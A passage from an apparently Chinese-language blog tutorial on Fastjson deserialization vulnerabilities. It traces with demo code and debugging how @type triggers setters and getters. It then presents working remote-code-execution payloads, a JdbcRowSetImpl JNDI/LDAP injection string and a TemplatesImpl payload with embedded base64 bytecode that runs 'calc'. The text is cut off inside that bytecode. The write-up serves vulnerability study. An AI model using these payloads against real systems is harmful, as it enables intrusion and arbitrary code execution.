class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//DEMO.java</span></span><br><span class="line"><span class="keyword">package</span> fastjson;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.*;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DEMO</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;benben&quot;</span>, <span class="number">19</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> JSON.toJSONString(user, SerializerFeature.WriteClassName);</span><br><span class="line">        System.out.println(json);</span><br><span class="line">        System.out.println(JSON.toJSONString(user))</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>上面的DEMO运行的结果如下<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">有参</span><br><span class="line">getAge</span><br><span class="line">getname</span><br><span class="line">&#123;&quot;@type&quot;:&quot;fastjson.User&quot;,&quot;age&quot;:19,&quot;name&quot;:&quot;benben&quot;&#125;</span><br><span class="line"></span><br><span class="line">getAge</span><br><span class="line">getname</span><br><span class="line">&#123;&quot;age&quot;:19,&quot;name&quot;:&quot;benben&quot;&#125;</span><br></pre></td></tr></table></figure><br>可以发现其不仅输出了json的内容还输出了getAge和getname这也就证明了在我们使用<code>JSON.toJSONString(user, SerializerFeature.WriteClassName);</code>去将类序列化为json时触发了类的getter方法。<br>解释一下上面的json字符串当我们使用JSON.toJSONString有在有第二个参数设置为SerializerFeature.WriteClassName时会在前面加一个@type即其标记了这个类的类型。<br>而直接使用的话就没有标记类的类名</p>
<p>我们在尝试将其字符串反序列化<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DEMO</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;fastjson.User\&quot;,\&quot;age\&quot;:3,\&quot;name\&quot;:\&quot;benben\&quot;&#125;&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">json2</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;age\&quot;:3,\&quot;name\&quot;:\&quot;benben\&quot;&#125;&quot;</span>;<span class="comment">//当我们直接使用JSON.toJSONString(user)来序列化时就是这个结果，少了个类的类型的键值对</span></span><br><span class="line">        System.out.println(JSON.parseObject(json, User.class)+<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        System.out.println(JSON.parseObject(json)+<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        System.out.println(JSON.parse(json)+<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        System.out.println(JSON.parseObject(json2, User.class)+<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        System.out.println(JSON.parseObject(json2)+<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        System.out.println(JSON.parse(json2)+<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><br>上面的输出结果如下<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">无参</span><br><span class="line">setAge</span><br><span class="line">setname</span><br><span class="line">fastjson.User@7a4f0f29</span><br><span class="line"></span><br><span class="line">无参</span><br><span class="line">setAge</span><br><span class="line">setname</span><br><span class="line">getAge</span><br><span class="line">getname</span><br><span class="line">&#123;&quot;haha&quot;:&quot;aaa&quot;,&quot;name&quot;:&quot;benben&quot;,&quot;age&quot;:3&#125;</span><br><span class="line"></span><br><span class="line">无参</span><br><span class="line">setAge</span><br><span class="line">setname</span><br><span class="line">fastjson.User@4ee285c6</span><br><span class="line"></span><br><span class="line">无参</span><br><span class="line">setAge</span><br><span class="line">setname</span><br><span class="line">fastjson.User@621be5d1</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;benben&quot;,&quot;age&quot;:3&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;benben&quot;,&quot;age&quot;:3&#125;</span><br></pre></td></tr></table></figure><br>我们可以发现只有通过@Type指定类或者在parseObject第二个参数指定类了才能够输出类。<br>我们可以发现除了最后两个其他的姿势都可以触发setter。</p>
<h2 id="尝试删除属性"><a href="#尝试删除属性" class="headerlink" title="尝试删除属性"></a>尝试删除属性</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">(String name, <span class="type">int</span> age)</span>&#123;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;有参&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;无参&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> Map <span class="title function_">getMap</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getHaha&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getname&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;aaa&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getAge&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setname&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">//Runtime.getRuntime().exec(&quot;calc&quot;);</span></span><br><span class="line">        System.out.println(<span class="string">&quot;setAge&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//DEMO.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DEMO</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;fastjson.User\&quot;,\&quot;age\&quot;:3,\&quot;name\&quot;:\&quot;benben\&quot;,\&quot;haha\&quot;:\&quot;aaa\&quot;&#125;&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">json2</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;age\&quot;:3,\&quot;name\&quot;:\&quot;benben\&quot;&#125;&quot;</span>;</span><br><span class="line">        <span class="type">ParserConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ParserConfig</span>();</span><br><span class="line">        System.out.println(JSON.parseObject(json)+<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//输出</span></span><br><span class="line">setAge</span><br><span class="line">setname</span><br><span class="line">getAge</span><br><span class="line">getHaha</span><br><span class="line">getname</span><br><span class="line">&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;aaa&quot;</span>,<span class="string">&quot;age&quot;</span>:<span class="number">0</span>&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>其成功输出了getter和setter，即getter和setter的触发与是否定义了属性无关，下面的调试过程中也会讲到，因为其是直接通过反射来获取所有的method，然后再过滤然出setter，后再反射调用</p>
<h1 id="为什么会触发setter与getter-代码调试"><a href="#为什么会触发setter与getter-代码调试" class="headerlink" title="为什么会触发setter与getter(代码调试)"></a>为什么会触发setter与getter(代码调试)</h1><p>想要深入了解这个框架漏洞的成因，以及了解之后bypass和原理代码的调试是少不了的。<br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/3.png" class="" title="alt text"><br>我们简单调试一下这个输出所有getter和setter的代码<br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/4.png" class="" title="alt text"><br>我们在步入parseObject后可以发现其调用了一个parse()，而后使用<br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/5.png" class="" title="alt text"><br>我们先步过一些parse()会发现控制台输出了setAge和setName。即其触发了set方法</p>
<p>那么之后触发getter方法的地方应该就是在JSON.toJSON(obj)了。</p>
<h2 id="怎么触发的setter"><a href="#怎么触发的setter" class="headerlink" title="怎么触发的setter"></a>怎么触发的setter</h2><p>我们先调试一下parse看看其是怎么触发setter的<br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/6.png" class="" title="alt text"><br>步入parse我们可以看到其先使用DefaultJSONPaser来对text即我们传入的json字符进行处理（并不是很重要），这里我就不步入了<br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/7.png" class="" title="alt text"><br>步入parse.parse我们可以看到其赋值了应该lexer。<br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/8.png" class="" title="alt text"><br>这个lexer其实就是一个包含了text和一些其他用来描述text的属性的类<br>之后进入一个switch语句，这个switch语句的作用就是匹配第一个字符为什么。<br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/9.png" class="" title="alt text"><br>因为第一个是左大括号所有进入LBRACE。我们可以发现其又实例化一个JSONObject，之后再调用parseObject方法。<br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/10.png" class="" title="alt text"><br>简单调一下会发现第一个Object返回的是一个HashMap。<br>我们步入parseObject<br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/11.png" class="" title="alt text"><br>之后就是利用死循环来判断<code>&#123;</code>下一个的字符是为单引号还是双引号(我们的是双引号)<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (ch == <span class="string">&#x27;&quot;&#x27;</span>) &#123;</span><br><span class="line">    key = lexer.scanSymbol(symbolTable, <span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line">    lexer.skipWhitespace();</span><br><span class="line">    ch = lexer.getCurrent();</span><br><span class="line">    <span class="keyword">if</span> (ch != <span class="string">&#x27;:&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;expect &#x27;:&#x27; at &quot;</span> + lexer.pos() + <span class="string">&quot;, name &quot;</span> + key);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; </span><br></pre></td></tr></table></figure><br>上面的的代码匹配到双引号后会通过scanSymbol来获取下一个<code>&quot;</code>直接的字符串，即我们的<code>@Type</code>如果”下一个不是:就抛出异常。<br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/12.png" class="" title="alt text"><br>继续往下调会调到一个判断我们得到的key是什么的if语句。我们的if的@Type所有进入上图的if<br>上面的if继续获取<code>&quot;</code>之间的字符串，即其会得到@Type的值也就是得到fastjson.User。<br>然后会通过loadClass来加载类。我们步入<br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/13.png" class="" title="alt text"><br>可以发现其先尝试从缓存中获取这个类。获取不到就走到如下代码<br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/14.png" class="" title="alt text"><br>匹配开头的<code>[</code>与<code>L</code>开头<code>;</code>结尾的如果匹配到就删除<code>[</code>和<code>L  ;</code><br>上面的地方之后还会被bypass利用<br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/15.png" class="" title="alt text"><br>接下来就是通过Classloder来加载类，并且把类写入到缓存mapping里了<br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/16.png" class="" title="alt text"><br>之后查看下一个是否为右大括号，即是到头了。当然没有结束于是会跳过，<br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/18.png" class="" title="alt text"><br>然后走到图上的代码，这里会获取一个serializer器。我们步入看一下<br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/19.png" class="" title="alt text"><br>其先尝试再derializers这个Map里查找我们的Type类，如果能找到整个Map就会返回反序列化器。<br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/57.png" class="" title="alt text"><br>我们可以看到Map里被写入了很多的特定类对应的反序列化器<br>但是这是我们自定义的所以当然找不到，所以返回空。<br>于是就跳到了如下代码使用如下方法来获取反序列化器<br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20.png" class="" title="alt text"><br>我们步入代码<br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/21.png" class="" title="alt text"><br>之后会进入一堆if判断，我们都进不去一路步过会走到getName方法<br>之后就是对我们的类名进行一系列的判断，判断过了就使用forName来加载，当然我们过不了。<br>最后会进入else来创建反序列化器。<br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/22.png" class="" title="alt text"><br>步入函数<br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/23.png" class="" title="alt text"><br>我们步入前面都是一大堆判断不用管往下调会构造info<br>之后又是一堆判断我们继续走会走到如下代码<br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/24.png" class="" title="alt text"><br>步入改代码<br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/25.png" class="" title="alt text"><br>上图代码将类的所有方法名，属性名赋值给了数组。<br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/26.png" class="" title="alt text"><br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/27.png" class="" title="alt text"><br>之后会走到如上的for循环来变量方法名。就是过滤出setter的类，进行了一些判断如长度，返回值是否为空，方法是否为非静态，开头是否为set，第四个字符是否为大写等<br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/36.png" class="" title="alt text"><br>过了就将其加到fieldlist里。</p>
<img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/28.png" class="" title="alt text">
<p>之后还有变量所有filed，所有的getter。</p>
<p>我们来看一下其遍历getter的逻辑<br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/29.png" class="" title="alt text"><br>其他的都差不多，但是其有一个很重要的就是其检测了返回的值的类型，要为Map或者AtomicBoolean等。<br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/30.png" class="" title="alt text"><br>这三个遍历结束后就返回我们创建的info。<br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/37.png" class="" title="alt text"><br>步出之后又是一堆检测像如下的检测了是否只有getter方法<br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/31.png" class="" title="alt text"><br>当然过不了。我们继续调会发现也没什么东西了，可以一路调出去。如下<br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/32.png" class="" title="alt text"><br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/33.png" class="" title="alt text"><br>但是如果再继续调试就会发现我们调试的内容再IDEA不显示了。这个是反序列化器的原因。</p>
<p>如果我们想继续调试看后面的内容就需要换应该反序列化器。如果我们能进入如下代码将asmEnable改为false就会获取到另一个反序列化器<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (FieldInfo fieldInfo : beanInfo.fields) &#123;</span><br><span class="line">        <span class="keyword">if</span> (fieldInfo.getOnly) &#123;</span><br><span class="line">            asmEnable = <span class="literal">false</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>那么我们就需要使得fieldInfo.getOnly为true，即我们要获得应该getter使其add到fields数组里</p>
<p>我们只需要再User写一个getMap其返回值为map即可。如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> Map map;</span><br><span class="line">    <span class="keyword">public</span> String haha;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">(String name, <span class="type">int</span> age)</span>&#123;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;有参&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;无参&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> Map <span class="title function_">getMap</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getHaha&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> map;<span class="comment">//为了在构造info是被获取</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getname&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getAge&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setname&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">//Runtime.getRuntime().exec(&quot;calc&quot;);</span></span><br><span class="line">        System.out.println(<span class="string">&quot;setAge&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这时候我们在调试就可以正常调试后面的内容了<br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/38.png" class="" title="alt text"><br>我们步入deserialze，之后会进入一堆if判断和赋值，不重要我们一路调到如下代码<br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/39.png" class="" title="alt text"><br>我们看到其通过了createInstance来创建实例化一个类。我们步入看一下<br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/40.png" class="" title="alt text"><br>看上面的代码可以知道其对类进行了实例化，这也是为什么会触发构造方法<br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/41.png" class="" title="alt text"><br>之后再往下调我们就可以发现其重写了setValue方法。我们继续步入<br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/42.png" class="" title="alt text"><br>可以发现其通过反射来调用setter。</p>
<h2 id="怎么触发的getter"><a href="#怎么触发的getter" class="headerlink" title="怎么触发的getter"></a>怎么触发的getter</h2><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/43.png" class="" title="alt text">
<p>进入toJSON前面都是一些判断和赋值，还有和parse相似的实例化等过程<br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/44.png" class="" title="alt text"><br>我们直接跳到触发点<br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/45.png" class="" title="alt text"><br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/46.png" class="" title="alt text"><br>其通过遍历map来触发后invoke来调用</p>
<h1 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h1><p>既然每次反序列化一个类时都会触发setter那么我们反序列化一个setter可以触发命令执行等恶意行为的类，不就可以进行命令执行了吗?</p>
<p>目前网上主要有对两种类的命令执行</p>
<h2 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> fastjson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.*;</span><br><span class="line"><span class="keyword">import</span> com.sun.rowset.JdbcRowSetImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">jdbcrowsetlmpl</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1/HHfKyiQrGd/CommonsCollections1/Exec/eyJjbWQiOiJjYWxjIn0=\&quot;, \&quot;autoCommit\&quot;:false&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>fastJson反序列化的链子还是很短的，是比较好分析的。<br>我们先来看一下JdbcRowSetImpl的源码<br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/47.png" class="" title="alt text"><br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/48.png" class="" title="alt text"><br>我们可以看到再connect下存在一个lookup，其参数就是this.getdataSource也就是dataSource的值。这个是我们可控的。那么再这里我们就可以使用JNDI注入</p>
<p>再看一下哪里触发了这个connect可以发现再setAutoCommit下触发了这个方法。那么一切都很明确了。</p>
<p>就是通过fastJson-&gt;setAutoCommit-&gt;connect-&gt;var1.lookup(dataSoure)</p>
<img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/49.png" class="" title="alt text">
<p>注意<br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/50.png" class="" title="alt text"><br>因为autoCommit的值为boolean值所有再构造的payload中要给其赋值为true或者false</p>
<h2 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> fastjson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Fastjson_Temp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">ParserConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ParserConfig</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">text</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,\&quot;_bytecodes\&quot;:[\&quot;yv66vgAAADIANAoABwAlCgAmACcIACgKACYAKQcAKgoABQAlBwArAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAtManNvbi9UZXN0OwEACkV4Y2VwdGlvbnMHACwBAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsHAC0BAARtYWluAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEABGFyZ3MBABNbTGphdmEvbGFuZy9TdHJpbmc7AQABdAcALgEAClNvdXJjZUZpbGUBAAlUZXN0LmphdmEMAAgACQcALwwAMAAxAQAEY2FsYwwAMgAzAQAJanNvbi9UZXN0AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABwAAAAAABAABAAgACQACAAoAAABAAAIAAQAAAA4qtwABuAACEgO2AARXsQAAAAIACwAAAA4AAwAAABEABAASAA0AEwAMAAAADAABAAAADgANAA4AAAAPAAAABAABABAAAQARABIAAQAKAAAASQAAAAQAAAABsQAAAAIACwAAAAYAAQAAABcADAAAACoABAAAAAEADQAOAAAAAA